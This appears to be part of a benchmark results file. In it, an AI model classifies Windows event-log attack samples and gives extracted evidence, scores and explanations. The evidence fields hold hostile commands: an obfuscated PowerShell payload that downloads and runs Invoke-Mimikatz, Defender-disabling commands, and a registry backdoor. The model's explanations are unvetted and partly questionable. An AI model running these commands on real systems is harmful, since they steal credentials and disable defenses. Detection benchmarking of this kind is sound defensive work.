+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Windows Defender Antimalware Engine (MsMpEng.exe) executing wevtutil.exe to uninstall a specific manifest file related to its own platform components. This is a routine maintenance or update action performed by the security software itself under the SYSTEM account, not an external attack or malicious tampering."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID7000,7009,7045-Payload deployed via service - Tchopper.evtx",medium,A,error,NO,0.0,0.0,NO,,,,,,,,0.09,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID11,13,17,18-PSexec as system execution.csv",,,processed,YES,100.0,65.8,YES,"1, 13, 11, 17, 18, 22","PsExec64.exe, cmd.exe, PSEXESVC.exe, services.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","PsExec64.exe  -i -s cmd, ""cmd""",10.23.42.38,"HKU\S-1-5-21-4230534742-2542757381-3142984815-1111\Software\Sysinternals\PsExec\EulaAccepted, HKLM\System\CurrentControlSet\Services\PSEXESVC\Start, HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath",0.0,8.48,4.0,5.0,4.0,3,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 13, 11, 17, 18, 22
+- Processes: PsExec64.exe, cmd.exe, PSEXESVC.exe, services.exe
+- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
+- Commands: PsExec64.exe  -i -s cmd, ""cmd"" 
+- Network: 10.23.42.38
+- Registry: HKU\S-1-5-21-4230534742-2542757381-3142984815-1111\Software\Sysinternals\PsExec\EulaAccepted, HKLM\System\CurrentControlSet\Services\PSEXESVC\Start, HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath
+
+EXPLANATION:
+The logs show the execution of PsExec64.exe with the `-s` flag to spawn a SYSTEM-level command prompt, which is a common technique for privilege escalation and lateral movement. The creation of the PSEXESVC service and associated named pipes confirms the installation of a remote execution tool, while the DNS query for 'fs03vuln' resolving to 10.23.42.38 indicates network-based command and control or lateral movement activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4698,4699,5145,4624-ATexec remote trask creation (GLOBAL).csv",,,processed,YES,100.0,73.3,YES,"4624, 5145, 4698, 4688, 4699","cmd.exe, svchost.exe, conhost.exe, whoami.exe","admmig, FS01$","cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, whoami","10.23.23.9, 10.23.123.11",,0.0,7.49,4.4,6.0,4.0,4,18.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5145, 4698, 4688, 4699
+- Processes: cmd.exe, svchost.exe, conhost.exe, whoami.exe
+- Accounts: admmig, FS01$
+- Commands: cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, whoami
+- Network: 10.23.23.9, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show the creation of a hidden scheduled task named ""bouWFQYO"" by user ""admmig"" that executes ""cmd.exe"" to run ""whoami"" and write output to a temporary file, which is a common technique for persistence or command execution. The subsequent access to the ADMIN$ share and the execution of processes by the SYSTEM account (FS01$) indicate that the task was successfully registered and executed, demonstrating unauthorized privilege escalation and persistence mechanisms."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).csv",,,processed,YES,100.0,94.4,YES,"1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447","cmd.exe, conhost.exe, cscript.exe, WmiPrvSE.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$, NT AUTHORITY\LOCAL SERVICE","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1","10.23.123.11, 127.0.0.1","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,61.42,5.7,5.0,4.0,3,17.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447
+- Processes: cmd.exe, conhost.exe, cscript.exe, WmiPrvSE.exe, MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$, NT AUTHORITY\LOCAL SERVICE
+- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1
+- Network: 10.23.123.11, 127.0.0.1
+- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates
+
+EXPLANATION:
+The logs show the Security Event Log being cleared (Event ID 1102) by user 'admmig', followed immediately by the creation of `cmd.exe` processes spawned by `WmiPrvSE.exe` (WMI Provider Service) executing commands to write files to the `ADMIN$` share, which is a classic WMI lateral movement and persistence technique. Additionally, `cscript.exe` is executed by the Monitoring Agent to run `MonitorKnowledgeDiscovery.vbs`, indicating potential abuse of legitimate system tools for reconnaissance or execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,87.5,YES,1,"powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))",,,0.0,3.22,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, WmiPrvSE.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows PowerShell executing a command with obfuscated syntax (`Get-C`ommand`) and variable expansion, which is a common technique to evade detection. The parent process `WmiPrvSE.exe` spawning PowerShell is also suspicious, as WMI providers typically do not launch PowerShell directly, suggesting potential lateral movement or persistence mechanisms."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-WMIexec process execution.evtx,easy,A,processed,YES,100.0,90.0,YES,1,cmd.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat | C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat,127.0.0.1,,33.3,4.96,5.4,6.0,2.7,4,18.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: cmd.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat ; C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
+- Network: 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The activity involves the creation and execution of a temporary batch file (`execute.bat`) by `cmd.exe` running under SYSTEM privileges, which is a common technique for executing arbitrary commands or establishing persistence. The parent process command line explicitly shows the creation of this script to execute commands and write output to a network share path (`\\127.0.0.1\C$\__output`), indicating potential data exfiltration or lateral movement preparation. This pattern of creating, executing, and deleting temporary scripts with high-privilege access is highly indicative of malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-PowerShell BITS job started.evtx,medium,B,processed,YES,100.0,76.7,YES,"800, 4104, 4103",powershell.exe,OFFSEC\admmig,Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,,0.0,5.54,4.6,6.0,4.0,3,17.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1
+- Network: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+- Registry: None
+
+EXPLANATION:
+The logs show PowerShell executing `Start-BitsTransfer` to download a script from a GitHub URL associated with Atomic Red Team (a known adversary simulation framework), which is a common technique for downloading malicious payloads or tools. The use of BITS (Background Intelligent Transfer Service) to fetch remote files is a specific evasion technique often used to bypass network monitoring and download malware."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4720,4698-Fortinet APT group abuse on Windows.csv",,,processed,YES,100.0,100.0,YES,"4720, 4698",,"WADGUtilityAccount, elie, admmig",adf,,,0.0,3.66,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4720, 4720, 4698
+- Processes: None
+- Accounts: WADGUtilityAccount, elie, admmig
+- Commands: adf
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the creation of two new user accounts followed immediately by the registration of a scheduled task named ""SynchronizeTimeZone"" that executes the non-standard command ""adf"". This pattern of creating accounts and establishing a persistence mechanism via a suspicious scheduled task is indicative of an attacker establishing initial access and maintaining persistence."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,62.5,YES,33205,,"OFFSEC\admmig, test-sql",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,,,0.0,2.53,3.8,6.0,4.0,3,16.8,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, test-sql
+- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event records the addition of a user to the 'sysadmin' server role, which grants full administrative control over the SQL Server instance. This privilege escalation allows the account 'test-sql' to bypass all security checks, representing a critical security risk and potential persistence mechanism for an attacker."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,80.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*",,,0.0,4.18,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4688
+- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
+- Accounts: lambda-user, offsec\honey-pot1
+- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the execution of `setspn.exe` to add a Service Principal Name (SPN) for a SQL service and query all SPNs, which are common techniques used in Kerberoasting attacks to enumerate and target service accounts. The use of the `-T` flag to query all SPNs (`*/*`) specifically indicates an attempt to harvest credentials for potential offline cracking. This activity, performed by `lambda-user` via `cmd.exe`, is a strong indicator of credential harvesting rather than routine administrative maintenance."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,6.54,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5145, 4724, 4738
+- Processes: None
+- Accounts: admmig, hacker2, ROOTDC1$
+- Commands: None
+- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
+- Registry: None
+
+EXPLANATION:
+The logs show the account 'admmig' performing a password reset (Event 4724) and account modification (Event 4738) on the user 'hacker2', which is a common technique for maintaining persistence or escalating privileges. This activity is preceded by multiple network logons (Event 4624) and a file share access to 'samr' (Event 5145), indicating active reconnaissance and manipulation of directory services from an external IP address. The combination of modifying another user's credentials and accessing SAM database files via network shares is highly indicative of malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,100.0,YES,"4728, 4756",,"CN=honey-pot1, OU=Test-OU, OU=OFFSEC-COMPANY, DC=offsec, DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user",,,,0.0,4.45,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4728, 4756
+- Processes: None
+- Accounts: CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a single user, `lambda-user`, adding the account `honey-pot1` to multiple high-privilege groups (Domain Admins, Enterprise Admins, Schema Admins) within milliseconds of each other. This rapid escalation of privileges to the most powerful groups in the Active Directory environment is a classic indicator of privilege escalation attacks, such as Golden Ticket or DCSync preparation. The speed and scope of these group membership changes are highly anomalous and indicative of malicious intent."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4674,6416 New external device connected (PrintNightmare).csv",,,processed,YES,100.0,100.0,YES,"6416, 4688, 4674","cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe","FS03$, admmig","""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",\\fs03vuln\Kiwi Legit Printer,"\REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer",0.0,6.88,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 6416, 4688, 4674
+- Processes: cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe
+- Accounts: FS03$, admmig
+- Commands: ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+- Network: \\fs03vuln\Kiwi Legit Printer
+- Registry: \REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer
+
+EXPLANATION:
+The logs show the Print Spooler service (spoolsv.exe) executing cmd.exe and accessing a network printer share named ""Kiwi Legit Printer,"" which is a known indicator of the PrintNightmare (CVE-2021-34527) vulnerability exploitation. The use of SeTakeOwnershipPrivilege by the spooler process to access registry keys related to this printer connection confirms an attempt to install a malicious driver or execute code with SYSTEM privileges. This pattern of spooler spawning command shells and accessing suspicious network resources is characteristic of active exploitation."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID47x,4661-4662,5136,4688,4697-SAM the admin (CVE-2021-42287).csv",,,processed,YES,100.0,60.1,YES,"4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688","C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, compnay-88$, rootdc1, HealthMailboxa935ecda17404b4a85c3f146fe1def56, admmhorvath, ROOTDC1$, LocalSystem","C:\Windows\system32\cmd.exe /Q /c echo cd  > \\127.0.0.1\C$\__output 2>&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a",,0.0,23.04,3.6,6.0,4.0,4,17.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688
+- Processes: C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
+- Accounts: hack1, compnay-88$, rootdc1, HealthMailboxa935ecda17404b4a85c3f146fe1def56, admmhorvath, ROOTDC1$, LocalSystem
+- Commands: C:\Windows\system32\cmd.exe /Q /c echo cd  > \\127.0.0.1\C$\__output 2>&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+- Network: 10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a
+- Registry: None
+
+EXPLANATION:
+The logs show a clear attack chain where the account 'hack1' creates a new machine account ('compnay-88$') and sets its password, followed by the creation of a malicious service ('BTOBTO') that executes a command to write to a network share. This activity is indicative of the DCSync attack technique or credential theft via service creation, allowing the attacker to extract credentials from the Domain Controller. The subsequent execution of `cmd.exe` and `conhost.exe` confirms the successful execution of the malicious payload."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4674,5142-Mimikatz print spool privileges requested.csv",,,processed,YES,100.0,75.0,YES,"4674, 5142",C:\Windows\System32\spoolsv.exe,"admmig, FS03VULN$",,,,0.0,3.67,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4674, 5142
+- Processes: C:\Windows\System32\spoolsv.exe
+- Accounts: admmig, FS03VULN$
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the user 'admmig' repeatedly using 'SeTakeOwnershipPrivilege' via the Print Spooler service ('spoolsv.exe') to interact with a printer object, followed immediately by the creation of a network share ('Kiwi Legit Printer') by the system account. This pattern is characteristic of the PrintNightmare (CVE-2021-34527) vulnerability exploitation, where attackers abuse the Print Spooler service to achieve privilege escalation and establish persistence or lateral movement via shared resources."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,5.65,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4648, 4624, 4688
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
+- Accounts: admmig, test10, FS03$
+- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The sequence begins with Event ID 1102, indicating the Security log was cleared by user 'admmig', which is a common anti-forensic technique to hide subsequent actions. Immediately following this, the same user performs a logon as 'test10' via PowerShell and executes 'whoami' commands, suggesting an attempt to verify identity or establish a foothold after attempting to erase audit trails. This combination of log clearing and immediate command execution under a different account context is highly indicative of malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","MSFRottenPotato.exe, cmd.exe, conhost.exe","hack1, ANONYMOUS LOGON, FS03VULN$","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.32,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4624, 4688, 4688
+- Processes: MSFRottenPotato.exe, cmd.exe, conhost.exe
+- Accounts: hack1, ANONYMOUS LOGON, FS03VULN$
+- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
+- Network: 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The logs show the execution of MSFRottenPotato.exe, a known privilege escalation tool, followed by the spawning of cmd.exe and conhost.exe with elevated privileges (TokenElevationType %%1936/%%1937). The sequence includes clearing the security event log (Event ID 1102) by user 'hack1', which is a common anti-forensic technique to hide such attacks. The presence of an ANONYMOUS LOGON and the use of NTLM authentication from localhost further indicate suspicious activity consistent with privilege escalation attempts."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4648, 4624, 4672","runas.exe, svchost.exe, cmd.exe, conhost.exe, ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,5.68,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4648, 4624, 4672
+- Processes: runas.exe, svchost.exe, cmd.exe, conhost.exe, ctfmon.exe
+- Accounts: admmig, hack1, FS03$
+- Commands: runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
+- Network: ::1
+- Registry: None
+
+EXPLANATION:
+The sequence shows an attacker clearing security logs (Event ID 1102) to hide activity, followed by using `runas` to spawn a `cmd.exe` session under the `hack1` account. This is followed by a high-privilege logon (Event ID 4672) granting `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, indicating privilege escalation and potential system compromise."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,hard,C,processed,YES,100.0,100.0,YES,"800, 4104, 4103",powershell.exe,OFFSEC\hack1,"Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', prompt",,"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account",0.0,72.29,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\hack1
+- Commands: Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', prompt
+- Network: None
+- Registry: SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account
+
+EXPLANATION:
+The logs show the execution of the `Add-RemoteRegBackdoor` script, which is a known offensive tool used to modify registry permissions to create a persistent backdoor. The activity involves granting `ALL_ACCESS` to the `Everyone` group (SID `S-1-1-0`) on sensitive registry keys such as `SAM`, `SECURITY`, and `LSA`, which allows any user to read or modify critical security credentials and configuration data. This constitutes a clear persistence and privilege escalation attempt."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104 Defender critical features disabled (PowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104",powershell.exe,OFFSEC\admmig,"Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true",,,0.0,31.13,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a sequence of PowerShell commands executed by the user `OFFSEC\admmig` that systematically disable multiple core security features of Microsoft Defender, including Real-time Monitoring, IOAV Protection, Behavior Monitoring, and Network Protection. This pattern of disabling antivirus and firewall protections via `Set-MpPreference` is a classic indicator of defense evasion, often performed by malware or attackers to prevent detection of subsequent malicious activities."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-5447-4950-Firewall disabled (command).evtx,hard,C,error,NO,0.0,0.0,NO,,,,,,,,0.40,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4742,4935,4662,4661,5137-DCshadow attack (GLOBAL) failed.csv",,,processed,NO,100.0,50.0,YES,"4662, 4742, 4935, 5137, 5136, 4936, 4929",,"admmig, JUMP01$",,jump01.offsec.lan,,0.0,9.17,3.0,1.0,4.0,3,11.0,C,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4662, 4742, 4935, 5137, 5136, 4936, 4929
+- Processes: None
+- Accounts: admmig, JUMP01$
+- Commands: None
+- Network: jump01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The logs show the account 'admmig' performing standard Active Directory replication and object modification tasks, specifically updating Service Principal Names (SPNs) for the computer account 'JUMP01$'. These events (4662, 4742, 5136, 5137) are consistent with legitimate administrative maintenance or automated synchronization processes rather than malicious privilege escalation or unauthorized access. There are no indicators of compromise such as suspicious command execution, lateral movement, or data exfiltration."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,69.4,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N